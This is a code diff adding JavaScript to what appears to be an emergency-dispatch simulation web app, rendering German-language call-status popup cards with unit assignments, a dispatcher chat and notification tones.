+const CPMSG={"Eingegangen":"Dein Notruf ist in der Leitstelle eingegangen. Ein Disponent meldet sich.","In Bearbeitung":"Ein Disponent bearbeitet deinen Notruf.","Einheiten alarmiert":"Einheiten wurden alarmiert und sind auf dem Weg zu dir.","Einheit vor Ort":"Eine Einheit ist bei dir vor Ort."};
+function cpPing(){try{const B=fxBus();if(!B)return;const t=B.a.currentTime+.03;tone(B,t,880,.14,.4);tone(B,t+.2,1175,.2,.4)}catch(e){}}
+function cpCard(d){
+ const k=Math.max(0,DSTAT.indexOf(d.status)),pr=PRL[prio(d)],ch=d.chat||[],un=d.units||[],mn=cpM[d.id];
+ const fl=cpLast[d.id]&&cpLast[d.id].s!==d.status?" fl":"";
+ const unread=Math.max(0,ch.length-(cpSeen[d.id]||0));
+ const head=`<div class="cph"><b><span class="cpd"></span>Einsatz #${d.id}${mn&&unread?` <span class="cpb">${unread}</span>`:""}</b><span class="tag ${stc(d.status)}">${d.status}</span><button onclick="cpTog(${d.id})" title="${mn?"Aufklappen":"Einklappen"}">${mn?"▲":"▼"}</button></div>`;
+ if(mn)return `<div class="cpc${fl}">${head}</div>`;
+ const steps=`<div class="cpst">${STL.map((x,i)=>`<i class="${i<k?"d":i===k?"c":""}"></i>`).join("")}</div><div class="cpsl">${STL.map((x,i)=>`<span class="${i===k?"c":""}">${x}</span>`).join("")}</div>`;
+ const msgs=ch.slice(-5).map(c=>`<p><b style="color:${c.w==="Leitstelle"?"var(--ac2)":"var(--tx)"}">${esc(c.w)}</b> <span class="mut">${fmt(c.ts)}</span><br>${esc(c.t)}</p>`).join("")||'<p class="mut">Noch keine Nachrichten.</p>';
+ return `<div class="cpc${fl}">${head}${steps}<div class="cpm">${CPMSG[d.status]||""}</div>
+ <div class="cpi">Art: <b>${esc(d.cat)}</b> · Priorität: <b style="color:${pr[1]}">${pr[0]}</b></div>
+ <div class="cpi">📍 <b>${esc(d.loc)}</b></div>${d.desc?`<div class="cpi">📝 ${esc(d.desc)}</div>`:""}
+ <div class="cpi">⏱ Seit <b class="cpt" data-t="${d.t}">${mmss(Date.now()-d.t)}</b> · abgesetzt ${fmt(d.t)}</div>
+ <div class="cpi">🚀 Einheiten: <b>${un.length?un.map(esc).join(", "):"noch keine zugewiesen"}</b>${un.length?` (${(d.ack||[]).length}/${un.length} bestätigt)`:""}</div>
+ <div class="cpch" id="cpch${d.id}">${msgs}</div>
+ <div class="cpr"><input data-cp="${d.id}" placeholder="Nachricht an die Leitstelle" autocomplete="off" onkeydown="if(event.key==='Enter')cpSend(${d.id})"><button onclick="cpSend(${d.id})">Senden</button></div></div>`}
+function callPop(){
+ let root=document.getElementById("cpop");
+ const L=rank[role]>=1?disp.filter(d=>d.from===meName()&&d.status!=="Abgeschlossen").sort((a,b)=>a.t-b.t):[];
+ if(!L.length){if(root)root.remove();cpLast={};return}
+ if(!root){root=document.createElement("div");root.id="cpop";document.body.appendChild(root)}
+ let ping=0;
+ L.forEach(d=>{const n=(d.chat||[]).length,o=cpLast[d.id];
+  if(o){if(o.s!==d.status)ping=1;const nc=(d.chat||[]).slice(o.n).some(c=>c.w==="Leitstelle");if(nc)ping=1}
+  if(!cpM[d.id])cpSeen[d.id]=n});
+ const ae=document.activeElement,keep={};
+ root.querySelectorAll("input[data-cp]").forEach(i=>{keep[i.dataset.cp]={v:i.value,f:i===ae}});
+ const sc={};root.querySelectorAll(".cpch").forEach(c=>{sc[c.id]=c.scrollTop+c.clientHeight>=c.scrollHeight-4});
+ root.innerHTML=L.map(cpCard).join("");
+ root.querySelectorAll("input[data-cp]").forEach(i=>{const k=keep[i.dataset.cp];if(k){i.value=k.v;if(k.f)i.focus()}});
+ root.querySelectorAll(".cpch").forEach(c=>{if(sc[c.id]!==false)c.scrollTop=c.scrollHeight});
+ L.forEach(d=>{cpLast[d.id]={s:d.status,n:(d.chat||[]).length}});
+ if(ping)cpPing()}
+function cpTog(id){cpM[id]=!cpM[id];callPop()}
+function cpSend(id){const i=document.querySelector('#cpop input[data-cp="'+id+'"]'),d=disp.find(x=>x.id===id);if(!i||!d)return;const t=i.value.trim();if(!t)return;d.chat.push({w:d.from,t,ts:Date.now()});i.value="";save();render()}
+setInterval(()=>{document.querySelectorAll("#cpop .cpt").forEach(e=>{e.textContent=mmss(Date.now()-(+e.dataset.t))})},1000);
 </script>
 </body>
 </html>
